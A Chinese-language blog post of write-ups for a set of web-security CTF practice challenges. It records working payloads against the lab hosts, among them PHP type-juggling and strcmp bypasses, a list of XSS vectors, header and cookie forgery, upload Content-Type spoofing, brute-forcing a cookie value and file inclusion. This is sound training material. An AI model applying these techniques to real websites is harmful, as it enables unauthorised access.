---
title: 合天Web进阶部分题目Writeup
date: 2017-10-10 18:08:02
tags:
	- CTF
	- Writeup
---

持续更新中。。
<!-- more -->

## 捉迷藏
[题目地址](http://218.76.35.75:20111 "题目地址")

右键查看源代码：

	<p><a href="Index.php"><font color="black">index</font></a></p>

点击Index.php跳转,获得flag

	A HIDDEN FLAG: FLAG{th!5!5n0tth3fl@g}
这题略坑啊，还有假flag。。意义何在呢。(╯‵□′)╯︵┻━┻
## 简单问答

[题目地址](http://218.76.35.75:20112 "题目地址")

右键查看源代码后，将disable删掉，选好正确答案提交，并不对，抓一下包。发现答案被改了，而且还有个success=false,直接改成true，再次提交。

	q1=2016&q2=lol&q4=22&success=true
还是Fail,看代码里提交的参数是q1,q2,q4啊..

试了试提交q3..flag出来了。这题坑吧。。。还是我忽略了啥。
	payload:

	Post：q1=2016&q2=lol&q3=22&success=true

flag为：

	flag{W3ll_d0n3}
## 后台后台后台

[题目地址](http://218.76.35.75:20113 "题目地址")

进入后直接Enter下，给了个提示

	Only Member with Admin rights is allow to enter 
然后抓了下包，发现cookie中有Member这个参数

	Cookie: User=JohnTan101; Member=Tm9ybWFs;
解码得

	Tm9ybWFs --> Normal
根据提示，修改Member的值为QWRtaW4=(base64--Admin)
获得flag
	
	flag{C00ki3_n0m_n0m_n0m}

## php是最好的语言

[题目地址](http://218.76.35.75:20114/index.php "题目地址")


打开后有源代码
	
	<?php
	show_source(__FILE__);
	$v1=0;$v2=0;$v3=0;
	$a=(array)json_decode(@$_GET['foo']);
	if(is_array($a)){
    	is_numeric(@$a["bar1"])?die("nope"):NULL;
    	if(@$a["bar1"]){
    	    ($a["bar1"]>2016)?$v1=1:NULL;
    	}
    	if(is_array(@$a["bar2"])){
        	if(count($a["bar2"])!==5 OR !is_array($a["bar2"]	[0])) die("nope");
    	    $pos = array_search("nudt", $a["a2"]);
    	    $pos===false?die("nope"):NULL;
    	    foreach($a["bar2"] as $key=>$val){
    	        $val==="nudt"?die("nope"):NULL;
    	    }
    	    $v2=1;
    	}
	}
	$c=@$_GET['cat'];
	$d=@$_GET['dog'];
	if(@$c[1]){
	    if(!strcmp($c[1],$d) && $c[1]!==$d){
	        eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
	        strpos(($c[0].$d), "htctf2016")?$v3=1:NULL;
	    }
	}
	if($v1 && $v2 && $v3){
    	include "flag.php";
    	echo $flag;
	}
	?>
分析：

	foo中有bar1，bar2，a2
    bar1的值不是数字且大于2016
    bar2是数组，其中的元素数为5，并且bar2的第一个元素是数组，bar2中有nudt
    a2为nudt
	cat[1]为一个数组
	dog和cat[0]中没有，3，1，c，可用00截断
	cat[0].dog中存在htctf2016

构造Payload

	http://218.76.35.75:20114/index.php?foo={"bar1":"9999a","bar2":[[1],1,2,3,0],"a2":["nudt",1,2,3,0]}&cat[0]=%00htctf2016&cat[1][]=2333&d=233

flag为：

	flag{php_i5_n0t_b4d}

JS加解密

HTML语言很松散，哪怕有标签没闭合，JS代码也可以执行

payload:

	<script>alert(1)</script>
	<img src=1 onerror=alert('123')>
	<svg/onload=alert(1)>
	<iframe src=javascript:alert(1)>


## Reappear
[题目地址](http://218.76.35.75:65180/ "题目地址")

题目描述说

	描述：网管说他安装了什么编辑器，但是似乎不太会用。。。
打开链接：

	Kindeditor v4.1.7
	something maybe in /kindeditor/

直接访问

	http://218.76.35.75:65180/kindeditor/
直接列目录了，挨个打开看了看，要不提示

	I don't think it will work
要不就提示

	You are very close!
没办法了，上网查Kindeditor v4.1.7 漏洞，找到一个路径泄露漏洞，在这个路径下

	/php/file_manager_json.php
直接访问:

	url: http://218.76.35.75:65180/kindeditor/php/file_manager_json.php
原始数据中获得json
	
	/var/www/html/Web/kind/kindeditor/attached
	{
    "moveup_dir_path": "", 
    "current_dir_path": "", 
    "current_url": "/kindeditor/php/../attached/", 
    "total_count": 2, 
    "file_list": [
        {
            "is_dir": false, 
            "has_file": false, 
            "filesize": 51, 
            "dir_path": "", 
            "is_photo": false, 
            "filetype": "php", 
            "filename": "flag_clue.php", 
            "datetime": "2015-11-16 21:58:28"
        }, 
        {
            "is_dir": false, 
            "has_file": false, 
            "filesize": 28, 
            "dir_path": "", 
            "is_photo": false, 
            "filetype": "html", 
            "filename": "index.html", 
            "datetime": "2015-11-16 21:37:12"
        }
    ]
}
发现在attached目录下有个flag_clue.php。直接访问获得

	=0nYvpEdhVmcnFUZu9GRlZXd7pzZhxmZ
看样子是反转后的base64。用python翻转然后解码得:

	ZmxhZzp7dXZlRG9uZUFncmVhdEpvYn0=
	
	flag:{uveDoneAgreatJob}

## default
[题目地址](http://218.76.35.74:20131/ "题目地址")

题目描述说
	
	描述：主页都没有了，就不要扫我了
那就上扫描器吧2333，御剑扫一下发现有index1.php,访问得

	flag 在变量里!
	<?php  

	error_reporting(0);
	include "flag1.php";	
	highlight_file(__file__);
	if(isset($_GET['args'])){
    	$args = $_GET['args'];
    	if(!preg_match("/^\w+$/",$args)){
        	die("args error!");
    	}
    	eval("var_dump($$args);");
	}
这题眼熟。。Bugku的Web-变量1.。

payload

	http://218.76.35.74:20131/index1.php?args=GLOBALS
返回

	array(7) { ["GLOBALS"]=> *RECURSION* ["_POST"]=> array(0) { } ["_GET"]=> array(1) { ["args"]=> string(7) "GLOBALS" } ["_COOKIE"]=> array(0) { } ["_FILES"]=> array(0) { } ["ZFkwe3"]=> string(38) "flag{F8871804DD8C20C66D2386B3E51ADEC4}" ["args"]=> string(7) "GLOBALS" } 
所以flag为

	flag{F8871804DD8C20C66D2386B3E51ADEC4}

## DrinkCoffee
[题目地址](http://218.76.35.75:65280/ "题目地址")

打开链接后有个提示

	Hint: Find the password to submit, but you should come from http://www.iie.ac.cn and your IP must be 10.10.20.1
用burpsuite抓包，从响应包的头里面找到password

	Password: d2626f412da748e711ca4f4ae9428664
解密得password是cafe,然后根据提示修改请求包

	X-Forwarded-For: 10.10.20.1
	Referer: http://www.iie.ac.cn
Go一下获得flag

	<script>alert('Flag: 84294deb396ba4373c5ea8b73fa111b2');</script>

flag为

	Flag: 84294deb396ba4373c5ea8b73fa111b2

## 简单的JS
[题目地址](http://218.76.35.75:20123 "题目地址")

打开题目连接，发现有提示

	The evil url is the passkey 

右键查看源代码，有一段JS

	p = "60,105,102,114,97,109,101,32,104,101,105,103,104,116,61,48,32,119,105,100,116,104,61,48,32,115,114,99,61,34,46,47,102,108,48,97,46,112,104,112,34,62"
	p = eval("String.fromCharCode(" + p + ")");
	document.write(p);
直接运行并不出啥结果。。加一句

	alert(p);
弹出	
	
	<iframe height=0 width=0 src="./fl0a.php">
访问
	
	http://218.76.35.75:20123/fl0a.php
显示

	flag is $flag
抓包，在cookie上发现flag

	Cookie: flag=C00k1els60SecU5e

## 简单的文件上传
[题目地址](http://218.76.35.75:20122 "题目地址")

这题做的我一脸懵逼。。

首先随便传了张jpg的图，提示

	upload success,but not php!
然后传了个php

	only accept jpg file~
试了试各种绕过，没成功。。然后抱着试试的心态改了下Content-Type，flag出来了。。这咋回事啊。

经过测试，解题方法为，上传一个.php文件，然后在burpsuite中，改一下Content-Type即可

	Content-Type: application/octet-stream
改为

	Content-Type: image/jpeg
即可

flag为

	upload Success!flag:Upl00d30668ss9h97aFil3
## php是门松散的语言
[题目地址](http://218.76.35.75:20124 "题目地址")

看代码

	- - - - - - - source code - - - - - - - - - -

	$he ='goodluck';

	parse_str($_GET['heetian']);

	if $he = 'abcd';

	echo $flag;

	he=?
payload:

	http://218.76.35.75:20124/?heetian=he=abcd
flag为

	flag:C00d1uckf0rY0uuu

## 试试XSS
[题目地址](http://218.76.35.75:20125 "题目地址")

点开链接，有提示

	Hint: alert document.domain.
随便提交一个123

然后右键查看源代码，有个img标签

	<img src='123 /></form>
构造代码闭合
	<img src='233'onclick=alert(document.domain)/></form>
提交
	
	233'onclick=alert(document.domain)
然后点击一下页面上出现的图片，但是弹出了一个IP。。

	
	218.76.35.75
document.domain是指当前域名，并不是flag。不过这几天我XSS没白学,于是乎试了下另一种

	233'onerror=alert(document.domain)
我去。。flag出来了，再提交试试。。又不出来了。。
后经表哥提醒，单引号后面少个空格，最终是

	233' onerror=alert(document.domain)
flag为

	flag:D0Gum6Ntd0M11n
看样子我有次提交时多加了个空格23333


## 简单的验证
[题目地址](http://218.76.35.75:20127 "题目地址")

打开题目后

	To the world you may be just somebody

	im not admin~
抓包，在cookies中发现

	Cookie: flag=C00k1els60SecU5e; user=Bob; guess=999
这个flag是之前那个题的。。不知为啥现在还有，不过增加了user和guess这两个键值对。猜测是当user=admin&guess=xxx时获得flag。
不写脚本了，直接用burpsuite的intruder模块爆破。。

将user的值改为admin，然后爆破guess的值，设定1-5000，步进为1.

	Cookie: flag=C00k1els60SecU5e; user=admin; guess=§999§
根据响应包的长度变化来判断。当guess=573时，获得flag

	but to somebody you may just be the world<p>
	</p>flag:EaSy70Ch1ngG00kie
burpsuite果然是神器。


## 简单的文件包含
[题目地址](http://218.76.35.75:20126 "题目地址")

题目提示：

	Flag 在/flag
打开网页后，有四个页面，依靠page参数链接。这提示太明显了，令page=/flag,右键查看源代码，获得flag

	 flag 不在这里<!-- flag: 62a72cb2f3d5e7fc0284da9f21e66c9f.php--></body>
访问获得flag:

	F11elNcLud3Get
